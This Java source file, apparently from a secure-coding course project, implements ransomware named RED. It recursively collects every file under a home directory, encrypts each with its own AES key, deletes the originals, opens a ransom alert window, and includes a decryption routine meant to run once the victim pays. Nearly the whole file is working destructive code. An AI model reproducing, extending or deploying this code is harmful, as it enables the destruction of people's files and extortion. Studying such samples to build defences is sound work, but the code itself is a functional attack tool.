package com.securecoding.phase3;

import java.awt.EventQueue;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
/**
 * 
 * @author Madhusudan Hanagal
 * @author Ganesh Rajashekharan
 * @author Ajit Paul
 *
 */
/**
 * RED: Ransomware Encryption and Decryption of Files.
 * This module will help in encrypting and de-cryption of all the files in the folder. 
 */
public class RED {
	
	static ArrayList<String> fileDetails = new ArrayList<>();
	static LinkedHashMap<String, SecretKey> fileKeys = new LinkedHashMap<>();
	
	static String ED_ALGO = "AES";
	//static String HOME = "/home/madhusudan/Desktop/A";
	static String HOME = "/home/Sample";
	
	public static void main(String[] args) {
			getAllFiles(HOME);
			REDencrypt();
			deleteFiles();
			REDRansom();
	}
	/**
	 * deleteFiles
	 * Delete all original files and keep only encrypted files
	 */
	private static void deleteFiles() {
		for(String f:fileDetails){
			System.out.println(f);
			File file = new File(f);
				file.delete();
		}
	}
	/**
	 * REDRansom
	 * UI popup
	 */
	private static void REDRansom() {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					REDRansom window = new REDRansom();
					window.frmAlert.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * REDdecrypt
	 * Decrypt All files using the secret keys after user pays the ransom
	 */
	public static void REDdecrypt() {
		FileInputStream fileInputStream = null;
		SecretKey secretKey;
		FileOutputStream fileOutputStream;
		CipherInputStream cipherInputStream;
		try {
		Set fdSet = fileKeys.entrySet();
		Iterator ite = fdSet.iterator();
		while(ite.hasNext()){
			Map.Entry<String,SecretKey> e = (Entry<String, SecretKey>) ite.next();
				String temp = e.getKey().substring(0,e.getKey().indexOf("."))+".aes";
				fileInputStream = new FileInputStream(temp);
			secretKey = e.getValue();
			Cipher cipher;
			
				cipher = Cipher.getInstance(ED_ALGO);
				cipher.init(Cipher.DECRYPT_MODE,secretKey);
				fileOutputStream = new FileOutputStream(e.getKey().substring(0,e.getKey().indexOf("."))+"1"
							+e.getKey().substring(e.getKey().indexOf("."),e.getKey().length()));
				cipherInputStream = new CipherInputStream(fileInputStream, cipher);
				decryptReadWrtie(fileOutputStream,cipherInputStream);
		}
		} catch (NoSuchAlgorithmException e1) {
			e1.printStackTrace();
		} catch (NoSuchPaddingException e1) {
			e1.printStackTrace();
		} catch (InvalidKeyException e1) {
			e1.printStackTrace();
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	}
	
	/**
	 * decryptReadWrtie
	 * @param fileOutputStream
	 * @param cipherInputStream
	 */
	private static void decryptReadWrtie(FileOutputStream fileOutputStream, CipherInputStream cipherInputStream) {
		int tempRead;
		byte[] buffer = new byte[4096];
		try {
			while((tempRead = cipherInputStream.read(buffer)) != -1){
				fileOutputStream.write(buffer, 0, tempRead);
			}
		} catch (IOException e) {
		}
		
	}

	/**
	 * REDencrypt
	 * Encrypt All Files recursively from given location 
	 */
	private static void REDencrypt() {
		try {
			/*
			 * Key Generation
			 */
			KeyGenerator keyGeneraator = KeyGenerator.getInstance(ED_ALGO);
			keyGeneraator.init(256);
			SecretKey secretKey;
			
			FileOutputStream fileoutStream;
			FileInputStream fileInpuStream;
			CipherOutputStream cipherOutputStream;
				try {
						for(String filePath:fileDetails){
							secretKey = keyGeneraator.generateKey();
							Cipher cipher = Cipher.getInstance(ED_ALGO);
							cipher.init(Cipher.ENCRYPT_MODE,secretKey);
							try {
								String temp = filePath.substring(0,filePath.indexOf("."))+".aes";
								fileoutStream = new FileOutputStream(temp);
								fileKeys.put(filePath, secretKey);
								fileInpuStream = new FileInputStream(filePath);
								cipherOutputStream = new CipherOutputStream(fileoutStream, cipher);
								encryptReadWrite(fileInpuStream,cipherOutputStream);
							} catch (FileNotFoundException e1) {
								e1.printStackTrace();
							} catch (IOException e1) {
								e1.printStackTrace();
							}
							
						}
				} catch (InvalidKeyException e) {
					e.printStackTrace();
				} catch (NoSuchPaddingException e) {
					e.printStackTrace();
				}
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}
	}
	/**
	 * readWrite
	 * @param fileInpuStream
	 * @param cipherOutputStream
	 */
	private static void encryptReadWrite(FileInputStream fileInpuStream, CipherOutputStream cipherOutputStream) {
		int tempRead;
		byte[] buffer = new byte[4096];
		try {
			while((tempRead = fileInpuStream.read(buffer)) != -1){
				cipherOutputStream.write(buffer, 0, tempRead);
			}
		} catch (IOException e) {
		}
	}
	/**
	 * getAllFiles
	 * @param filePath
	 * Store all filenames and their absolute paths in hashmap
	 */
	private static void getAllFiles(String filePath) {
		File file = new File(filePath);
		File[] dir = file.listFiles();
		for(File f:dir){
			if(f.isDirectory()){
				getAllFiles(f.getAbsolutePath());
			}else{
				if(!f.getName().contains(".aes") && !f.getName().contains(".DS_Store")){
					fileDetails.add(f.getAbsolutePath());
				}
			}
		}
	}
	
}
